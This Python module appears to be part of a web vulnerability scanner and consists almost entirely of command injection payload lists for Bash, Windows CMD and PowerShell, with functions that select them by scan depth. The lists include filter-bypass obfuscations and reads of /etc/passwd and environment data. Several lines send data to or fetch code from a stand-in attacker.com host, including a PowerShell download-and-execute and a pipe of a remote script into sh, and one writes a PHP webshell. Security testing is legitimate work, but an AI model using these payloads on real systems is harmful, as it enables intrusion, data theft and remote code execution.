"""
Command Injection Payloads — Bash, Windows CMD, PowerShell, blind detection,
and filter bypass vectors.
"""

# ── Unix/Bash Injection ──────────────────────────────────────────────────────
BASH_PAYLOADS = [
    '; id',
    '| id',
    '`id`',
    '$(id)',
    '; id #',
    '| id #',
    '; whoami',
    '| whoami',
    '`whoami`',
    '$(whoami)',
    '; cat /etc/passwd',
    '| cat /etc/passwd',
    '; uname -a',
    '| uname -a',
    '& id',
    '&& id',
    '|| id',
    '\n id',
    '\r\n id',
    '; ls -la',
    '| ls -la',
    '$(cat /etc/passwd)',
    '`cat /etc/passwd`',
    '; echo vulnerable',
    '| echo vulnerable',
]

# ── Windows CMD Injection ────────────────────────────────────────────────────
WINDOWS_PAYLOADS = [
    '& dir',
    '| dir',
    '& whoami',
    '| whoami',
    '& type C:\\Windows\\win.ini',
    '| type C:\\Windows\\win.ini',
    '& ipconfig',
    '| ipconfig',
    '& net user',
    '| net user',
    '& systeminfo',
    '&& dir',
    '|| dir',
    '& echo vulnerable',
    '| echo vulnerable',
]

# ── Blind Time-Based Detection ───────────────────────────────────────────────
BLIND_PAYLOADS = [
    # Unix sleep-based
    '; sleep 5',
    '| sleep 5',
    '`sleep 5`',
    '$(sleep 5)',
    '& sleep 5',
    '&& sleep 5',
    '|| sleep 5',
    # Windows ping-based (5 pings ≈ 4-5 seconds)
    '& ping -n 5 127.0.0.1',
    '| ping -n 5 127.0.0.1',
    '& timeout /t 5',
    # Unix ping-based
    '; ping -c 5 127.0.0.1',
    '| ping -c 5 127.0.0.1',
]

# ── Filter Bypass ────────────────────────────────────────────────────────────
FILTER_BYPASS = [
    # IFS (Internal Field Separator) trick
    ';${IFS}id',
    '|${IFS}id',
    ';{id}',
    ';$IFS$9id',
    # Tab/newline separators
    ";\tid",
    "|\tid",
    ";\nid",
    # Wildcard tricks
    ';/???/??t /???/??ss??',         # /bin/cat /etc/passwd
    ';/???/??n/w?o???',              # /usr/bin/whoami
    # Variable trick
    ";a]b]c=i]d;$a$b$c".replace(']', ''),
    # Base64 decode execution
    ';echo${IFS}aWQ=|base64${IFS}-d|sh',
    ';echo${IFS}d2hvYW1p|base64${IFS}-d|sh',
    # Backslash trick
    ';i\\d',
    ';wh\\oam\\i',
    ';ca\\t /et\\c/pas\\swd',
    # Quote tricks
    ";i''d",
    ";w'h'o'a'm'i",
    ';i""d',
    ';w"h"o"a"m"i',
    # Caret tricks (Windows)
    '& w^h^o^a^m^i',
    '& d^i^r',
]

# ── Command Output Indicators ────────────────────────────────────────────────
COMMAND_OUTPUT_PATTERNS = [
    'uid=',                    # id command output
    'gid=',                    # id command output
    'root:',                   # /etc/passwd
    'bin/bash',                # /etc/passwd
    'bin/sh',                  # /etc/passwd
    'daemon:x:',              # /etc/passwd
    'Volume Serial Number',    # Windows dir
    'Directory of',            # Windows dir
    'Linux ',                  # uname -a
    'Darwin ',                 # uname -a (macOS)
    'Windows IP Configuration', # ipconfig
    'total ',                  # ls -la output
    'drwx',                    # ls -la output
    'vulnerable',              # echo test
]


# ── DNS Exfiltration / Out-of-Band ────────────────────────────────────────────
OOB_PAYLOADS = [
    '| nslookup $(whoami).attacker.com',
    '| curl http://attacker.com/$(whoami)',
    '| wget http://attacker.com/$(cat /etc/hostname)',
    '& nslookup %COMPUTERNAME%.attacker.com',
    '| dig $(id | base64).attacker.com',
    '`curl http://attacker.com/$(uname -a | base64)`',
    '; ping -c 1 $(whoami).attacker.com',
    '$(nslookup $(cat /etc/hostname).attacker.com)',
    '| curl -d @/etc/passwd http://attacker.com/exfil',
]

# ── Environment / Information Extraction ──────────────────────────────────────
INFO_PAYLOADS = [
    '; printenv',
    '| env',
    '; set',
    '| cat /proc/self/environ',
    '& echo %PATH%',
    '; cat /proc/self/cmdline',
    '| ps aux',
    '; cat /etc/os-release',
    '| cat /etc/hostname',
    '; df -h',
    '| mount',
    '; netstat -tlnp',
    '| ss -tlnp',
    '; ip addr',
    '| ifconfig',
]

# ── PowerShell Injection ─────────────────────────────────────────────────────
POWERSHELL_PAYLOADS = [
    '& powershell -c "whoami"',
    '| powershell -c "Get-Process"',
    '& powershell -c "Get-Content C:\\Windows\\win.ini"',
    '| powershell -c "$env:USERNAME"',
    '& powershell -c "Invoke-WebRequest http://attacker.com/$(whoami)"',
    '| powershell -ep bypass -c "iex(iwr http://attacker.com/shell.ps1)"',
    '& powershell -c "[System.Net.Dns]::GetHostAddresses(\'attacker.com\')"',
    '| powershell -c "Test-NetConnection -Port 80 127.0.0.1"',
    '& powershell -c "Get-Service"',
    '| powershell -c "Get-ChildItem Env:"',
    '& powershell -c "Start-Sleep -Seconds 5"',
    '| powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes(\'C:\\Windows\\win.ini\'))"',
]

# ── Advanced Blind Detection ─────────────────────────────────────────────────
ADVANCED_BLIND = [
    # Time-based (various delay methods)
    '; sleep 3',
    '| sleep 3',
    '$(sleep 3)',
    '`sleep 3`',
    '; ping -c 3 127.0.0.1',
    '| ping -c 3 127.0.0.1',
    '& timeout /t 3',
    '& ping -n 3 127.0.0.1',
    # Time-based alternative (Perl/Python/Ruby)
    '; perl -e "sleep(3)"',
    '| python -c "import time;time.sleep(3)"',
    '| python3 -c "import time;time.sleep(3)"',
    '; ruby -e "sleep(3)"',
    '| node -e "setTimeout(()=>{},3000)"',
    # Comparison blind
    '; test 1 = 1 && sleep 3',
    '; [ 1 = 1 ] && sleep 3',
    '; if [ 1 -eq 1 ]; then sleep 3; fi',
]

# ── Advanced Filter Bypass ───────────────────────────────────────────────────
ADVANCED_FILTER_BYPASS = [
    # $() substitution
    '$(cat${IFS}/etc/passwd)',
    '$(whoami)',
    # Env variable tricks
    '${PATH:0:1}etc${PATH:0:1}passwd',  # /etc/passwd via PATH
    # Brace expansion
    '{cat,/etc/passwd}',
    '{ls,-la,/}',
    # Hex encoding
    ";echo -e '\\x69\\x64'|sh",          # 'id' in hex
    ";echo -e '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'|sh",
    # Octal encoding
    ";echo $'\\151\\144'|sh",             # 'id' in octal
    # Base64 with various decoders
    ';echo aWQ=|base64 -d|sh',
    ';echo d2hvYW1p|base64 -d|sh',
    ';echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh',
    ';python -c "exec(\'aWQ=\'.decode(\'base64\'))"',
    ';echo aWQ= | openssl base64 -d | sh',
    # Rev shell tricks using environment
    ";a]c]a]t]=${IFS};b]/]e]t]c]/]p]a]s]s]w]d=${IFS};cat /etc/passwd".replace(']', ''),
    # Tab as separator
    ";\tid",
    "|\tid",
    ";cat\t/etc/passwd",
    # Newline as separator
    "%0aid",
    "%0Aid",
    "%0d%0aid",
    # Dollar sign tricks
    ';i$()d',
    ';wh$()oam$()i',
    ";ca$()t /et$()c/pas$()swd",
    # Concatenation
    ";a]='c';b]='at';c]=' /etc/passwd';$a$b$c".replace(']', ''),
    # Time-based with IFS
    ';${IFS}sleep${IFS}3',
    # Using printf
    '$(printf "\\x69\\x64")',
    ';$(printf "\\151\\144")',
    # Using xxd
    ';echo 6964 | xxd -r -p | sh',
    # Using rev
    ';echo "di" | rev | sh',
    ';echo "dwssap/cte/ tac" | rev | sh',
    # Using cut/tr
    ";echo aWQ= | base64 -d | tr -d '\\n' | sh",
]

# ── Chained Command Operators ────────────────────────────────────────────────
CHAINED_OPERATORS = [
    '; id ; whoami ; uname -a',
    '| id | whoami',
    '&& id && whoami',
    '|| id || whoami',
    '; id; whoami; cat /etc/passwd',
    '$(id)$(whoami)',
    '`id``whoami`',
    '& whoami & ipconfig & net user',
    '&& dir && type C:\\Windows\\win.ini',
]

# ── Special Character Abuse ──────────────────────────────────────────────────
SPECIAL_CHARS = [
    # Backtick chaining
    '`id`',
    '`whoami`',
    '`cat /etc/passwd`',
    # Semicolon with encoding
    '%3Bid',
    '%3Bwhoami',
    '%3Bcat%20/etc/passwd',
    # Pipe with encoding
    '%7Cid',
    '%7Cwhoami',
    # Ampersand
    '%26id',
    '%26whoami',
    # Newline bytes
    'id%0A',
    'id%0D%0A',
    # Null byte
    'id%00',
    'id\x00',
]

# ── File Write / Webshell Upload ─────────────────────────────────────────────
FILE_WRITE = [
    '; echo "<?php system($_GET[c]); ?>" > /tmp/shell.php',
    '| echo "pwned" > /tmp/pwned.txt',
    '; cp /etc/passwd /tmp/leaked.txt',
    '& echo pwned > C:\\temp\\pwned.txt',
    '; wget http://attacker.com/shell.php -O /tmp/shell.php',
    '| curl http://attacker.com/shell.sh | sh',
]


def get_all_cmdi_payloads() -> list:
    """Return all command injection payloads combined."""
    return (
        BASH_PAYLOADS + WINDOWS_PAYLOADS + BLIND_PAYLOADS +
        FILTER_BYPASS + OOB_PAYLOADS + INFO_PAYLOADS +
        POWERSHELL_PAYLOADS + ADVANCED_BLIND + ADVANCED_FILTER_BYPASS +
        CHAINED_OPERATORS + SPECIAL_CHARS + FILE_WRITE
    )


def get_cmdi_payloads_by_depth(depth: str) -> list:
    """Return depth-appropriate command injection payloads."""
    if depth == 'shallow':
        return BASH_PAYLOADS[:5] + WINDOWS_PAYLOADS[:3] + BLIND_PAYLOADS[:3]
    elif depth == 'medium':
        return (BASH_PAYLOADS + WINDOWS_PAYLOADS[:8] + BLIND_PAYLOADS +
                FILTER_BYPASS[:10] + POWERSHELL_PAYLOADS[:4] + ADVANCED_BLIND[:5])
    else:  # deep
        return get_all_cmdi_payloads()
